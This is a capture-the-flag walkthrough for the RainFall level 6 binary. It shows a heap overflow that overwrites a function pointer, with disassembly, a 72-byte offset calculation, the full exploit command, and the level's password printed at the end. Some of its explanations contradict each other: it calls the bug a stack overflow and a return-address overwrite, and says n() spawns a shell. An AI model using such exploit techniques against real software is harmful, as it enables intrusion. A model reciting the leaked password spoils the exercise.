Level 6  Heap overflow + function pointer overwrite
-------

level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 423
Nope
level6@RainFall:~$ 

1) 
--
from the outpute we can see that when we execute the program without parameters it segfault, but when  adding a parameter it print Nope


2) 
After checking all functions with GDB we can see that 
n():

0x08048454 <+6>: movl $0x80485b0,(%esp)
0x08048461 <+13>: call 0x8048370 <system@plt>

So calling n() triggers system("/bin/sh").

3) 

Inside the main():

strcpy is used with malloc’d buffers.

One buffer is 0x40 bytes (64 bytes).

Vulnerability: strcpy doesn’t check length → classic stack overflow.


Goal
-----

1) 
We want to overwrite the return address of main to point to n() so that the program executes system("/bin/sh").

To that we should:
Replace: 0x08048468   (m) with: 0x08048454   (n) , Because n() calls: system("/bin/sh")

Address of n: 0x08048454  (you can check it from info functions)

strcpy(buffer1, argv[1]);
Since argv[1] is not size-checked, we can overflow.

The heap contains:
ptr1 → 64 bytes buffer
ptr2 → 4 bytes (function pointer to m)

2) 
Lets calculate the offset:

[ 64 bytes buffer1 ]
[ 4 bytes  buffer2 ]
         
         =

[ chunk header ]
[ 64 bytes user data ]
[ chunk header ]
[ 4 bytes user data ]

Because heap chunks include metadata. and each malloc chunk has 8 bytes metadata.
so the real offset becomes 72 bytes
Ofsset = 72 bytes

3) 
Let's confirm runthe offset : 

inside gdb ./level6 we run :
run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

The outpute is :

program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

(gdb) info registers eip
eip            0x41346341	0x41346341

0x41346341 = 0x41 0x34 0x63 0x41 (little endian) = Ac4A it's in position 72

4) 
r
The address of n() in little endian is "\x54\x84\x04\x08" cause 0x08048454

Structure:

[ 72 bytes padding ]
[ address of n() ]

So: "A"*72 + "\x54\x84\x04\x08"

5) 

THe solution
------------

After this we can find the pass

level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
